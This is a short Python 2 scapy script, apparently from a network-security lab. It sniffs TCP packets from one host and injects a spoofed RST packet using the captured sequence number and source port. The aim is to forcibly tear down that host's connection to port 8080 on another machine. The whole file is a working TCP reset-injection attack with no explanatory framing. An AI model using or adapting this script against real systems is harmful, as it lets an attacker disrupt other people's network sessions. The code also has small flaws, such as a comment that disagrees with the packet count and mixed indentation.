#! /usr/bin/env python
from scapy.all import *

def packet_handler(pkt):
       iplayer=pkt.getlayer(IP)
       source_ip=iplayer.src
       
#Checking if the request is from the client      
       if source_ip== "192.168.56.2":
          print " source ip of packet is %s" % source_ip
          num=pkt.getlayer(TCP)
          #print(pkt.show())
          t_sequence= num.seq
          t_sourceport=num.sport  
          print "sequence number is %s" % t_sequence
#Calling function to send reset packet
	  terminate(t_sourceport, t_sequence)
          

def terminate(temp_sport, temp_seqnum):
    i= IP()
    i.src= "192.168.56.2"
    i.dst= "192.168.56.1"
    i.proto="tcp"

    t= TCP()
    t.sport=temp_sport
    t.dport=8080
    t.seq=temp_seqnum
    t.ack=045
    t.flags= "R"

    send(i/t)
    print "Reset Done"
       
#sniffing 5 TCP packet and sending it to Packethandler to extract sequence number    
sniff(iface="eth0", prn=packet_handler, count=2, filter="tcp")

